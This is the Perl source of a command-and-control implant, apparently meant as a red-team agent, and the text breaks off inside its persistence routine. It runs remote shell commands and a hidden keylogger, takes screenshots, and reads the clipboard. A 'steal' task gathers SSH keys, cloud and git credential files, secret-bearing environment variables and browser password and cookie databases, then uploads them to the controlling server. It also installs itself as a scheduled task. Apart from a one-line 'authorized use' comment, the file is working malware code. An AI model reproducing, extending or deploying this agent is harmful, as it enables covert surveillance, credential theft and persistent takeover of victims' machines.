#!/usr/bin/env perl
# agent.pl — C2 agent, Perl port (HTTP::Tiny + JSON::PP, both core).
#
# Port of clients/agent.py with identical CLI flags, task types and result
# shapes. Wire protocol documented in C2/protocol.md.
#
# Usage:
#   perl agent.pl --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
#   perl agent.pl --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
#                 --interval 5 --jitter 2 --verbose
#
# Environment variables (accepted when the flag is not given):
#   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
#
# Flags:
#   --server URL      server base URL (required unless C2_SERVER is set)
#   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
#   --interval N      heartbeat interval in seconds (default 10, min 1)
#   --jitter N        random jitter in seconds added to the interval
#   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
#   --verbose         print activity to stdout
#   -h, --help        show this help and exit
#
# Only use against systems you own or are authorized to test.

use strict;
use warnings;
use HTTP::Tiny;
use JSON::PP;
use POSIX qw(:sys_wait_h);
use File::Basename;
use File::Path qw(make_path);
use File::Spec;
use Getopt::Long;

# ---------------------------------------------------------------- constants

my $SHELL_TIMEOUT = 120;
my $OUTPUT_LIMIT  = 12000;
my $STATE_FILE    = File::Spec->catfile($ENV{HOME} || '.', '.c2agent.json');

# ---------------------------------------------------------------- globals

my $server   = '';
my $token    = '';
my $agent_id = '';
my $interval = $ENV{C2_INTERVAL} || 10;
my $jitter   = $ENV{C2_JITTER}   || 0;
my $verbose  = ($ENV{C2_VERBOSE} && ($ENV{C2_VERBOSE} eq '1' || $ENV{C2_VERBOSE} eq 'true') ? 1 : 0);
my $state_file = '';

my %clones;  # target -> {status, last_check, relaunches, command, stop, interval}

# ---------------------------------------------------------------- helpers

sub logmsg {
    print STDERR "[*] $_[0]\n" if $verbose;
}

sub truncate_output {
    my ($text) = @_;
    return $text if length($text) <= $OUTPUT_LIMIT;
    my $head = int($OUTPUT_LIMIT / 5);
    my $tail = $OUTPUT_LIMIT - $head - 40;
    my $omitted = length($text) - $head - $tail;
    return substr($text, 0, $head)
         . "\n... [$omitted chars truncated] ...\n"
         . substr($text, -$tail);
}

sub local_ip {
    # Best-effort local IP
    my $ip = '';
    eval {
        require IO::Socket::INET;
        my $sock = IO::Socket::INET->new(
            PeerAddr => '8.8.8.8', PeerPort => 80, Proto => 'udp', Timeout => 2
        );
        if ($sock) {
            $ip = $sock->sockhost;
            close($sock);
        }
    };
    return $ip if $ip && $ip ne '0.0.0.0';

    # Fallback
    $ip = `hostname -I 2>/dev/null` =~ /^(\S+)/ ? $1 : '';
    return $ip if $ip;
    $ip = `ip route get 1.1.1.1 2>/dev/null` =~ /src\s+(\S+)/ ? $1 : '';
    return $ip;
}

sub os_name {
    my $p = $^O;
    return 'windows' if $p =~ /mswin|mingw|cygwin/i;
    return 'darwin'  if $p =~ /darwin/i;
    return 'linux';
}

sub shell_escape {
    my ($s) = @_;
    $s =~ s/'/'\\''/g;
    return "'$s'";
}

sub winpath {
    my ($p) = @_;
    return $p unless $^O =~ /cygwin|msys/i;
    my $r = `cygpath -w "$p"`;
    $r =~ s/\r?\n$//;
    return $r =~ /^[A-Za-z]:/ ? $r : $p;
}

# ---------------------------------------------------------------- JSON HTTP

# TLS certificate verification is ON when IO::Socket::SSL is available.
# Operators using self-signed test certificates can opt out explicitly with
# C2_INSECURE_TLS=1 (honoured by curl-based clients as well).
my $OPTED_OUT_TLS = ($ENV{C2_INSECURE_TLS} // '') =~ /^(1|true|yes)$/i ? 1 : 0;
my $VERIFY_SSL = 0;
if ($OPTED_OUT_TLS) {
    logmsg("TLS certificate verification disabled via C2_INSECURE_TLS=1");
} else {
    $VERIFY_SSL = eval { require IO::Socket::SSL; 1 } ? 1 : 0;
}
my $http = HTTP::Tiny->new(
    agent       => 'c2agent/1.0',
    timeout     => 15,
    verify_SSL  => $VERIFY_SSL,
);

sub post_json {
    my ($path, $body) = @_;
    my $url = "$server$path";
    my $data = encode_json($body);
    my $res = $http->request('POST', $url, {
        content => $data,
        headers => {
            'Content-Type'   => 'application/json',
            'X-Agent-Token'  => $token,
        },
    });
    return {
        body => $res->{content} // '',
        code => $res->{status} // 0,
    };
}

sub get_url {
    my ($path) = @_;
    my $url = "$server$path";
    my $res = $http->request('GET', $url, {
        headers => { 'X-Agent-Token' => $token },
    });
    return {
        body => $res->{content} // '',
        code => $res->{status} // 0,
    };
}

# ---------------------------------------------------------------- state

sub load_id {
    return unless -f $STATE_FILE;
    open my $fh, '<', $STATE_FILE or return;
    my $content = do { local $/; <$fh> };
    close $fh;
    eval {
        my $data = decode_json($content);
        $agent_id = $data->{agent_id} // '';
    };
}

sub save_id {
    open my $fh, '>', $STATE_FILE or return;
    print $fh encode_json({ agent_id => $agent_id });
    close $fh;
}

# ------------------------------------------------------------- lifecycle

sub register {
    my $body = {
        agent_id => $agent_id || undef,
        hostname => (`hostname 2>/dev/null` || 'unknown') =~ s/\s+$//r,
        username => (`whoami 2>/dev/null` || '') =~ s/\s+$//r,
        os       => os_name(),
        arch     => (`uname -m 2>/dev/null` || '') =~ s/\s+$//r,
        pid      => $$,
        ip       => local_ip(),
        version  => '1.0',
        type     => 'Perl',
    };
    logmsg("registering with $server");
    my $res = post_json('/api/register', $body);
    if ($res->{code} != 200) {
        logmsg("register failed: HTTP $res->{code} — will retry on next checkin");
        return;
    }
    my $data = eval { decode_json($res->{body}) } // {};
    $agent_id = $data->{agent_id} // '';
    save_id();
    logmsg("agent id: $agent_id");
}

sub checkin {
    my $res = post_json('/api/checkin', { agent_id => $agent_id });
    if ($res->{code} == 404) {
        logmsg("server does not know us — re-registering");
        register();
        return ();
    }
    return () unless $res->{code} == 200;
    my $data = eval { decode_json($res->{body}) } // {};
    return @{ $data->{tasks} // [] };
}

sub report {
    my ($task_id, $output, $exit_code, $error) = @_;
    $error //= '';
    post_json('/api/result', {
        agent_id  => $agent_id,
        task_id   => $task_id,
        output    => $output // '',
        exit_code => $exit_code,
        error     => $error,
    });
}

# ---------------------------------------------------------------- tasks

sub kill_tree {
    my ($pid) = @_;
    # Best-effort: signal the process group first, then the process itself.
    eval { kill 'KILL', -$pid };
    kill 'KILL', $pid;
}

sub run_shell_win {
    # Windows (native MSWin32): run the batch through PowerShell Start-Process
    # -PassThru so a true timeout kills the whole cmd tree and returns 124.
    my ($batch, $outf, $timeout) = @_;
    local $ENV{C2BAT} = $batch;
    local $ENV{C2OUT} = $outf;
    local $ENV{C2TO}  = $timeout;
    my $ps = File::Spec->catfile(File::Spec->tmpdir, "c2run_$$.ps1");
    open my $pf, '>', $ps or return ("error: $!", 1);
    print $pf <<'PS';
$b = $env:C2BAT; $o = $env:C2OUT; $t = [int]$env:C2TO
if (Test-Path $o) { Remove-Item $o -Force }
$p = Start-Process -FilePath cmd.exe -ArgumentList '/c', "`"$b`"" -WindowStyle Hidden -PassThru -RedirectStandardOutput $o
if (-not $p.WaitForExit($t * 1000)) {
  try { $p.Kill(); $p.WaitForExit() } catch {}
  exit 124
}
exit $p.ExitCode
PS
    close $pf;
    my $rt = `powershell -NoProfile -ExecutionPolicy Bypass -File "$ps" 2>&1`;
    unlink $ps;
    my $output = '';
    if (open my $of, '<', $outf) {
        local $/;
        my $data = <$of>;
        $output = ($data // '');
    }
    unlink $outf;
    my $code = $? >> 8;
    return (truncate_output($output), $code);
}

sub run_shell {
    my ($command, $timeout) = @_;
    $timeout = $SHELL_TIMEOUT unless defined $timeout;
    $timeout = 1 if $timeout < 1;
    $timeout = 3600 if $timeout > 3600;
    logmsg("executing: $command");

    if ($^O eq 'MSWin32') {
        my $bat = File::Spec->catfile(File::Spec->tmpdir, "c2run_$$.cmd");
        open my $bfh, '>', $bat or return ("error: $!", 1);
        print $bfh '@echo off', "\r\n", $command, " 2>&1\r\nexit /b %ERRORLEVEL%\r\n";
        close $bfh;
        my $outf = "$bat.out";
        my $res = run_shell_win($bat, $outf, $timeout);
        unlink $bat;
        return $res;
    }

    # POSIX (incl. cygwin/msys): spawn `sh -c` in a child, read its output
    # with select(), and kill the whole tree when the deadline is reached.
    my $pid = open(my $fh, '-|');
    if (!defined $pid) {
        return ("error: fork failed: $!", 1);
    }
    if ($pid == 0) {
        open(STDERR, '>&STDOUT');
        exec '/bin/sh', '-c', $command;
        exit 127;
    }

    my $output   = '';
    my $deadline = time() + $timeout;
    my $eof      = 0;
    my $maxread  = $OUTPUT_LIMIT * 100;
    my $buf;
    while (1) {
        my $remaining = $deadline - time();
        last if $remaining <= 0;
        my $rin = '';
        vec($rin, fileno($fh), 1) = 1;
        select(my $rout = $rin, undef, undef, $remaining);
        my $n = sysread($fh, $buf, 65536);
        if (!defined $n) {
            last if $!{EINTR};
            last if $!{EAGAIN};
            last;
        }
        if ($n == 0) { $eof = 1; last; }
        $output .= $buf;
        # Stop buffering spammy output but keep draining until the deadline.
        if (length($output) >= $maxread) {
            my $rem = $deadline - time();
            select(undef, undef, undef, $rem) if $rem > 0;
            last;
        }
    }
    # Capture the exit status BEFORE close $fh: closing a pipe reaps the child
    # in some perls (e.g. cygwin), after which waitpid() fails and clobbers $?.
    if (!$eof) {
        kill_tree($pid);
        close $fh;
        waitpid($pid, 0);
        return (truncate_output($output) . "\ncommand timed out (${timeout}s)", 124);
    }
    waitpid($pid, 0);
    my $code = $? >> 8;
    close $fh;
    return (truncate_output($output), $code);
}

sub task_download {
    my ($task_id, $args) = @_;
    my $fname = $args->{file} || 'payload.bin';
    my $dest  = $args->{destination} || $fname;
    logmsg("downloading $fname to $dest");

    my $res = get_url("/api/files/$task_id");
    return ("download failed: HTTP $res->{code}", 1) if $res->{code} != 200;

    if (-d $dest) {
        $dest = File::Spec->catfile($dest, basename($fname));
    }
    my $parent = (File::Spec->splitpath($dest))[1];
    make_path($parent) if $parent && !-d $parent;

    open my $fh, '>', $dest or return ("failed to write $dest", 1);
    binmode $fh;
    print $fh $res->{body};
    close $fh;
    return ("saved " . length($res->{body}) . " bytes to $dest", 0);
}

sub task_upload {
    my ($task_id, $args) = @_;
    my $path = $args->{path} || '';
    return ('no path given', 1) unless $path;
    return ("file not found: $path", 1) unless -f $path;
    logmsg("uploading $path");

    # Read file
    open my $fh, '<', $path or return ("cannot read $path", 1);
    binmode $fh;
    my $file_data = do { local $/; <$fh> };
    close $fh;

    my $boundary = '----c2agent' . time();
    my $filename = basename($path);
    my $body = "--$boundary\r\n"
             . "Content-Disposition: form-data; name=\"file\"; filename=\"$filename\"\r\n"
             . "Content-Type: application/octet-stream\r\n\r\n"
             . "$file_data\r\n"
             . "--$boundary--\r\n";

    my $url = "$server/api/files/$task_id";
    my $res = $http->request('POST', $url, {
        content => $body,
        headers => {
            'Content-Type'  => "multipart/form-data; boundary=$boundary",
            'X-Agent-Token' => $token,
        },
    });
    if ($res->{status} == 200) {
        return ("uploaded $path", 0);
    }
    return ("upload failed: HTTP $res->{status}", 1);
}

sub task_sleep {
    my ($args) = @_;
    my $secs = $args->{seconds} || 10;
    $secs = 1 if $secs < 1;
    $interval = $secs;
    return ("heartbeat interval set to ${interval}s", 0);
}

# ---------------------------------------------------------------- keylog
# File-based keystroke logger. 'start' spawns a background collector
# (PowerShell GetAsyncKeyState on Windows, xinput->awk on Linux) that appends
# to a log file; 'dump' stops the collector and returns the captured text.

sub task_keylog {
    my ($args) = @_;
    my $action = lc($args->{action} || 'dump');
    if    ($action eq 'start') { my $m = klog_start(); return ($m, $m =~ /^error:/ ? 1 : 0); }
    elsif ($action eq 'stop')  { my $m = klog_stop();  return ($m, $m =~ /^error:/ ? 1 : 0); }
    else                       { return klog_dump(); }
}

sub klog_base {
    my $dir = (os_name() eq 'windows') ? ($ENV{TEMP} || '.') : '/tmp';
    return File::Spec->catfile($dir, ".c2keylog_$agent_id");
}

sub proc_alive {
    my ($pid) = @_;
    return 0 unless $pid =~ /^\d+$/ && $pid > 0;
    if (os_name() eq 'windows') {
        return system("tasklist /FI \"PID eq $pid\" >NUL 2>NUL") == 0;
    }
    return kill(0, $pid) ? 1 : 0;
}

sub klog_write_collectors {
    my ($base) = @_;
    open my $ps, '>', "$base.ps1" or return;
    print $ps <<'PS';
$C2P = $env:C2P; $C2K = $env:C2K
[IO.File]::WriteAllText($C2P, [string]$PID)
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);[DllImport("user32.dll")]public static extern short GetKeyState(int v);}'
$l = New-Object 'bool[]' 256
while (1) {
  Start-Sleep -Milliseconds 25
  for ($v = 8; $v -le 190; $v++) {
    $d = (([K]::GetAsyncKeyState($v) -band 1) -ne 0)
    if ($d -ne $l[$v]) {
      if ($d) {
        $c = $null
        if ($v -ge 65 -and $v -le 90) { $sh = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0); $cp = (([K]::GetKeyState(20) -band 1) -ne 0); $c = [char]($v + $(if ($sh -ne $cp) { 0 } else { 32 })) }
        elseif ($v -ge 48 -and $v -le 57) { $c = [char]$v } elseif ($v -eq 32) { $c = ' ' }
        elseif ($v -eq 13) { $c = [char]10 } elseif ($v -eq 9) { $c = '[TAB]' }
        elseif ($v -eq 8) { $c = '[BACKSPACE]' } elseif ($v -eq 27) { $c = '[ESC]' } elseif ($v -eq 46) { $c = '[DEL]' }
        elseif ($v -eq 37) { $c = '[LEFT]' } elseif ($v -eq 38) { $c = '[UP]' }
        elseif ($v -eq 39) { $c = '[RIGHT]' } elseif ($v -eq 40) { $c = '[DOWN]' }
        elseif ($v -ge 112 -and $v -le 123) { $c = '[F' + ($v - 111) + ']' }
        elseif ($v -eq 186) { $c = ';' } elseif ($v -eq 187) { $c = '=' }
        elseif ($v -eq 188) { $c = ',' } elseif ($v -eq 189) { $c = '-' }
        elseif ($v -eq 190) { $c = '.' } elseif ($v -eq 191) { $c = '/' }
        elseif ($v -eq 192) { $c = '`' } elseif ($v -eq 219) { $c = '[' }
        elseif ($v -eq 220) { $c = '\' } elseif ($v -eq 221) { $c = ']' }
        elseif ($v -eq 222) { $c = "'" }
        if ($c) { [IO.File]::AppendAllText($C2K, [string]$c) }
      }
      $l[$v] = $d
    }
  }
}
PS
    close $ps;
    open my $sh, '>', "$base.sh" or return;
    print $sh <<'SH';
#!/bin/sh
C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
echo $$ > "$C2P"
kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
[ -z "$kid" ] && exit 1
xinput test "$kid" 2>/dev/null | awk -v p="$C2K" '
BEGIN { n = split("2 3 4 5 6 7 8 9 10 11 16 17 18 19 20 21 22 23 24 25 30 31 32 33 34 35 36 37 38 44 45 46 47 48 49 50", a, " "); s = "1234567890qwertyuiopasdfghjklzxcvbnm"; for (i = 1; i <= length(s); i++) m[a[i]] = substr(s, i, 1) }
{ if ($1 == "key" && $2 == "press") { c = m[$3]; if ($3 == 57) c = " "; else if ($3 == 28) c = "\n"; else if ($3 == 15) c = "[TAB]"; else if ($3 == 14) c = "[BACKSPACE]"; else if ($3 == 1) c = "[ESC]"; else if ($3 == 111) c = "[DEL]"; else if ($3 == 42 || $3 == 54) c = "[SHIFT]"; else if ($3 == 29 || $3 == 97) c = "[CTRL]"; else if ($3 == 56 || $3 == 100) c = "[ALT]"; if (c != "") printf "%s", c > p } }'
SH
    close $sh;
}

sub klog_start {
    my $base = klog_base();
    my ($pidf, $logf) = ("$base.pid", "$base.log");
    if (-f $pidf) {
        open my $pf, '<', $pidf or return "keylogger already running";
        my $pid = <$pf>;
        close $pf;
        chomp $pid;
        return "keylogger already running" if proc_alive($pid);
    }
    klog_write_collectors($base);
    unlink $logf;
    local $ENV{C2P} = winpath($pidf);
    local $ENV{C2K} = winpath($logf);
    if (os_name() eq 'windows') {
        my $wbase = winpath($base);
        system("powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"$wbase.ps1\" >/dev/null 2>&1 &");
    } elsif (os_name() eq 'darwin') {
        return "error: keylogger not supported on macOS";
    } else {
        system("nohup sh '$base.sh' >/dev/null 2>&1 &");
    }
    for (1 .. 120) {
        last if -f $pidf;
        select(undef, undef, undef, 0.25);
    }
    return (-f $pidf) ? "keylogger started"
                      : "error: no keylogging tool available (powershell/xinput needed)";
}

sub klog_stop {
    my $base = klog_base();
    my $pidf = "$base.pid";
    return "keylogger not running" unless -f $pidf;
    open my $pf, '<', $pidf or return "keylogger stopped";
    my $pid = <$pf>;
    close $pf;
    chomp $pid;
    if (proc_alive($pid)) {
        if (os_name() eq 'windows') { system("taskkill /PID $pid /F /T >NUL 2>&1"); }
        else                         { kill('KILL', $pid); }
    }
    unlink $pidf;
    return "keylogger stopped";
}

sub klog_dump {
    my ($out) = klog_stop();
    return ($out, 1) unless $out eq 'keylogger stopped' || $out eq 'keylogger not running';
    my $logf = klog_base() . ".log";
    my $text = '';
    if (-f $logf) {
        open my $lf, '<', $logf or return ("error reading keylog", 1);
        binmode $lf;
        my $data = do { local $/; <$lf> };
        $text = $data;
    }
    return ("(no keystrokes recorded)", 0) if !$text;
    $text = "..." . substr($text, -8000) if length($text) > 8000;
    return ($text, 0);
}

sub task_clipboard {
    my ($args) = @_;
    my $action = lc($args->{action} || 'get');
    eval {
        if ($action eq 'set') {
            my $text = $args->{text} || '';
            if (os_name() eq 'windows') {
                # Pipe the text on stdin — never interpolate it into a
                # command string (single-quote injection).
                open my $cp, '|-', 'powershell', '-NoProfile', '-Command',
                    'Set-Clipboard -Value ([Console]::In.ReadToEnd())'
                        or die "powershell: $!";
                print $cp $text;
                close $cp;
            } elsif (os_name() eq 'darwin') {
                open my $pb, '|-', 'pbcopy' or die "pbcopy: $!";
                print $pb $text;
                close $pb;
            } else {
                open my $xc, '|-', 'xclip -selection clipboard' or die "xclip: $!";
                print $xc $text;
                close $xc;
            }
            return ('clipboard set', 0);
        } else {
            my $text = '';
            if (os_name() eq 'windows') {
                $text = `powershell -command Get-Clipboard` // '';
            } elsif (os_name() eq 'darwin') {
                $text = `pbpaste 2>/dev/null` // '';
            } else {
                $text = `xclip -selection clipboard -o 2>/dev/null` // '';
            }
            chomp $text;
            return ($text, 0);
        }
    };
    if ($@) {
        return ("error: $@", 1);
    }
    return ('error: clipboard operation failed', 1);
}

sub task_screenshot {
    my ($task_id, $args) = @_;
    my $label = ($args->{name} || 'screenshot') =~ s/\s+//gr;
    $label = 'screenshot' unless length $label;

    require File::Temp;
    my $tmpdir = $ENV{TEMP} || $ENV{TMPDIR} || '/tmp';
    my ($fh, $tmp) = File::Temp::tempfile(File::Spec->catfile($tmpdir, 'c2shot_XXXXXX'), SUFFIX => '.png');
    close $fh;

    my $os = os_name();
    if ($os eq 'windows') {
        my $winpath = winpath($tmp);
        my $pspath = File::Spec->catfile($ENV{TEMP} || 'C:/Windows/Temp',
                                         'c2shot_' . $$ . '.ps1');
        $pspath = winpath($pspath);
        open my $pf, '>', $pspath or return ("error: cannot write screenshot script: $!", 1);
        print $pf "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\r\n",
                  "\$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;\r\n",
                  "\$bmp=New-Object System.Drawing.Bitmap(\$b.Width,\$b.Height);\r\n",
                  "\$g=[System.Drawing.Graphics]::FromImage(\$bmp);\r\n",
                  "\$g.CopyFromScreen(\$b.Location,[System.Drawing.Point]::Empty,\$b.Size);\r\n",
                  "\$bmp.Save('$winpath');\r\n";
        close $pf;
        `powershell -NoProfile -ExecutionPolicy Bypass -File "$pspath"`;
        unlink $pspath;
    } elsif ($os eq 'darwin') {
        `screencapture -x $tmp`;
    } else {
        for my $tool ([qw(import -window root)], ['scrot'], ['gnome-screenshot', '-f']) {
            my $cmd = @$tool == 2 ? "$tool->[0] $tool->[1] $tmp" : "$tool->[0] $tmp";
            next unless `command -v $tool->[0] 2>/dev/null` =~ /\S/;
            `$cmd 2>/dev/null`;
            last if -s $tmp;
        }
    }

    if (!-s $tmp) { unlink $tmp; return ("error: screenshot failed (no tool or permission)", 1); }

    open my $rfh, '<', $tmp or return ("error: cannot read screenshot", 1);
    binmode $rfh;
    my $file_data = do { local $/; <$rfh> };
    close $rfh;
    unlink $tmp;

    my $boundary = '----C2Shot' . time();
    my $body = "--$boundary\r\n"
             . "Content-Disposition: form-data; name=\"file\"; filename=\"$label.png\"\r\n"
             . "Content-Type: image/png\r\n\r\n"
             . "$file_data\r\n"
             . "--$boundary--\r\n";

    my $url = "$server/api/files/$task_id";
    my $res = $http->request('POST', $url, {
        content => $body,
        headers => {
            'Content-Type'  => "multipart/form-data; boundary=$boundary",
            'X-Agent-Token' => $token,
        },
    });
    if ($res->{status} == 200) {
        return ("screenshot saved ($label.png)", 0);
    }
    return ("screenshot upload failed: HTTP $res->{status}", 1);
}

# ---------------------------------------------------------------- steal

my @STEAL_KEYWORDS = qw(
    token secret password passwd key= api auth
    aws azure google github gitlab slack discord
    cookie session credential access proxy login
);
my @STEAL_TOKEN_FILES = qw(
    .aws/credentials .aws/config
    .git-credentials .netrc .npmrc .pypirc
    .pip/pip.conf .config/pip/pip.conf
    .config/gh/hosts.yml .config/rclone/rclone.conf
    .config/gcloud/credentials.json .config/gcloud/access_tokens.db
    .docker/config.json .kube/config
    .ssh/id_rsa .ssh/id_ed25519 .ssh/id_ecdsa .ssh/config
    .ssh/known_hosts .ssh/authorized_keys
);
my $STEAL_MAX_FILE = 8 * 1024 * 1024;

my @CHROMIUM_FILES = ('Login Data', 'Cookies', 'Web Data');
my @FIREFOX_FILES  = ('cookies.sqlite', 'logins.json', 'key4.db', 'cert9.db');

sub steal_safe_copy {
    my ($src, $dst_dir) = @_;
    return 0 unless -f $src;
    return 0 if -s $src > $STEAL_MAX_FILE;
    make_path($dst_dir) unless -d $dst_dir;
    my $dst = File::Spec->catfile($dst_dir, basename($src));
    my $ok = eval {
        open my $in, '<', $src or die $!;
        binmode $in;
        open my $out, '>', $dst or die $!;
        binmode $out;
        while (my $chunk = do { local $/ = 65536; <$in> }) { print $out $chunk; }
        close $in; close $out;
        # preserve mtime if possible
        my @st = stat($src);
        utime $st[8], $st[9], $dst if @st >= 10;
        1;
    };
    return $ok ? 1 : 0;
}

sub steal_env {
    my ($work) = @_;
    my @lines;
    for my $k (sort keys %ENV) {
        my $low = lc $k;
        push @lines, "$k=$ENV{$k}" if grep { index($low, $_) >= 0 } @STEAL_KEYWORDS;
    }
    return () unless @lines;
    my $path = File::Spec->catfile($work, 'env.txt');
    open my $fh, '>', $path or return ();
    print $fh join("\n", @lines) . "\n";
    close $fh;
    return ('env.txt');
}

sub steal_tokens {
    my ($work) = @_;
    my $home = $ENV{HOME} || $ENV{USERPROFILE} || '';
    return () unless $home;
    my @hits;
    for my $rel (@STEAL_TOKEN_FILES) {
        my $src = File::Spec->catfile($home, $rel);
        my $dst_dir = File::Spec->catfile($work, 'tokens');
        if (steal_safe_copy($src, $dst_dir)) {
            push @hits, 'tokens/' . basename($rel);
        }
    }
    return @hits;
}

sub steal_browser_roots {
    my %roots;
    my $home = $ENV{HOME} || $ENV{USERPROFILE} || '';
    if ($^O =~ /mswin|mingw|cygwin/i) {
        my $la  = $ENV{LOCALAPPDATA} || '';
        my $app = $ENV{APPDATA} || '';
        for my $rel (
            'Google/Chrome/User Data',
            'Microsoft/Edge/User Data',
            'BraveSoftware/Brave-Browser/User Data',
            'Opera Software/Opera Stable',
        ) {
            $roots{File::Spec->catfile($la, $rel)} = 'chromium' if $la;
        }
        $roots{File::Spec->catfile($app, 'Mozilla/Firefox/Profiles')} = 'firefox' if $app;
    } elsif ($^O =~ /darwin/i) {
        my $base = File::Spec->catfile($home, 'Library', 'Application Support');
        for my $name ('Google/Chrome', 'Microsoft Edge', 'BraveSoftware/Brave-Browser') {
            $roots{File::Spec->catfile($base, $name)} = 'chromium';
        }
        $roots{File::Spec->catfile($base, 'Firefox', 'Profiles')} = 'firefox';
    } else {
        for my $rel ('google-chrome', 'chromium', 'microsoft-edge', 'msedge',
                     'brave-browser', 'brave', 'opera') {
            $roots{File::Spec->catfile($home, '.config', $rel)} = 'chromium';
        }
        $roots{File::Spec->catfile($home, '.mozilla', 'firefox')} = 'firefox';
    }
    return %roots;
}

sub steal_browser {
    my ($work) = @_;
    my @hits;
    my %roots = steal_browser_roots();
    for my $root (keys %roots) {
        next unless -d $root;
        my $kind = $roots{$root};
        my @targets = $kind eq 'firefox' ? @FIREFOX_FILES : @CHROMIUM_FILES;
        # walk the directory tree
        my @queue = ($root);
        while (my $dir = shift @queue) {
            opendir my $dh, $dir or next;
            my @entries = readdir $dh;
            closedir $dh;
            for my $entry (@entries) {
                next if $entry eq '.' || $entry eq '..';
                my $full = File::Spec->catfile($dir, $entry);
                if (-d $full) {
                    push @queue, $full;
                } elsif (-f $full) {
                    next unless grep { $_ eq $entry } @targets;
                    my $rel = File::Spec->abs2rel($dir, $root);
                    $rel =~ s|[\\/]|__|g;
                    my $dst = File::Spec->catfile($work, 'browser', $kind, $rel);
                    if (steal_safe_copy($full, $dst)) {
                        push @hits, "browser/$kind/$rel/$entry";
                    }
                }
            }
        }
    }
    return @hits;
}

sub task_steal {
    my ($task_id, $args) = @_;
    my $profile = lc($args->{profile} || 'all');
    $profile = 'all' unless $profile =~ /^(all|env|tokens|browser)$/;

    require File::Temp;
    my $work = File::Temp::tempdir('c2steal_', TMPDIR => 1, CLEANUP => 0);
    my @manifest;

    eval {
        if ($profile eq 'all' || $profile eq 'env') {
            logmsg("steal: collecting env vars");
            push @manifest, steal_env($work);
        }
        if ($profile eq 'all' || $profile eq 'tokens') {
            logmsg("steal: collecting token files");
            push @manifest, steal_tokens($work);
        }
        if ($profile eq 'all' || $profile eq 'browser') {
            logmsg("steal: collecting browser dbs");
            push @manifest, steal_browser($work);
        }
    };
    if ($@) {
        eval { _rmtree($work) };
        return ("error: $@", 1);
    }

    unless (@manifest) {
        eval { _rmtree($work) };
        return ("steal ($profile): nothing found", 1);
    }

    # write manifest
    my $mf = File::Spec->catfile($work, 'manifest.txt');
    if (open my $mfh, '>', $mf) {
        print $mfh join("\n", sort @manifest) . "\n";
        close $mfh;
    }

    # zip
    my $archive = File::Spec->catfile($work, 'steal.zip');
    my $zip_ok = system('zip', '-r', '-q', $archive, '.') == 0;
    if (!$zip_ok) {
        # fallback: tar
        $zip_ok = system('tar', 'czf', $archive, '-C', $work, '.') == 0;
        if ($zip_ok) {
            # rename .tar.gz -> .zip (server doesn't care, but keep name consistent)
            my $tgz = $archive;
            $archive = "$work/steal.tgz";
            rename $tgz, $archive if -f $tgz;
        }
    }

    unless ($zip_ok && -f $archive) {
        eval { _rmtree($work) };
        return ("steal: failed to create archive", 1);
    }

    # upload via inline multipart (reuse screenshot pattern)
    open my $rfh, '<', $archive or do { eval { _rmtree($work) }; return ("steal: cannot read archive", 1); };
    binmode $rfh;
    my $file_data = do { local $/; <$rfh> };
    close $rfh;
    my $size = -s $archive;

    my $boundary = '----C2Steal' . time();
    my $body = "--$boundary\r\n"
             . "Content-Disposition: form-data; name=\"file\"; filename=\"steal.zip\"\r\n"
             . "Content-Type: application/zip\r\n\r\n"
             . "$file_data\r\n"
             . "--$boundary--\r\n";

    my $url = "$server/api/files/$task_id";
    my $res = $http->request('POST', $url, {
        content => $body,
        headers => {
            'Content-Type'  => "multipart/form-data; boundary=$boundary",
            'X-Agent-Token' => $token,
        },
    });

    eval { _rmtree($work) };

    if ($res->{status} != 200) {
        return ("steal upload failed: HTTP $res->{status}", 1);
    }

    my $listing = join("\n", @manifest);
    my $n = scalar @manifest;
    my $out = "stole $n item(s) -> steal.zip (${size} bytes)\n$listing";
    $out = truncate_output($out, 4000);
    return ($out, 0);
}

sub _rmtree {
    my ($dir) = @_;
    return unless -d $dir;
    if ($^O =~ /mswin|mingw|cygwin/i) {
        system('rmdir', '/s', '/q', winpath($dir));
    } else {
        system('rm', '-rf', $dir);
    }
}

# ----------------------------------------------------------------- persistence

sub task_persistence {
    my ($args) = @_;
    my $srv  = $server;
    $srv =~ s|/+$||;
    my $tok = $token;
    my $iv  = $interval;
    my $jt  = $jitter;
    my $interp = $^X;
    my $self   = $0 || 'agent.pl';
    my $bname  = basename($self);
    my $os = os_name();
    my ($destdir, $dest);
    if ($os eq 'windows') {
        $destdir = File::Spec->catdir($ENV{APPDATA} || $ENV{USERPROFILE} || '.',
                                      'Microsoft', 'Windows', 'c2update');
        $dest = File::Spec->catfile($destdir, 'c2agent.pl');
    } else {
        $destdir = File::Spec->catdir($ENV{HOME} || '.', '.config', 'c2update');
        $dest = File::Spec->catfile($destdir, $bname);
    }
    make_path($destdir) unless -d $destdir;
    if ($os eq 'windows') {
        my $selfw = winpath($self);
        my $destw = winpath($dest);
        qx{cmd /c copy /y "$selfw" "$destw" >NUL 2>&1};
    } else {
        system('cp', '-f', $self, $dest);
    }
    my $cmd = qq{$interp "$dest" --server "$srv" --token "$tok" --interval $iv --jitter $jt};
    my $ok = 0;
    my $detail = '';
    if ($os eq 'windows') {
        my $progdata = $ENV{ProgramData} || $ENV{ALLUSERSPROFILE} || 'C:\ProgramData';
        my $wrapper_dir = File::Spec->catdir($progdata, 'c2update');
        make_path($wrapper_dir) unless -d $wrapper_dir;
        my $wrapper = File::Spec->catfile($wrapper_dir, 'c2relaunch.cmd');
        open my $fh, '>:raw', $wrapper
            or return ('persistence error: could not write launcher: ' . $!, 1);
        print $fh "\@echo off\r\nstart \"\" /b $cmd\r\n";
        close $fh;
        $detail = "persistence: wrote launcher $wrapper";
        if (system('schtasks', '/Create', '/TN', 'c2agent-persist', '/TR', $wrapper,
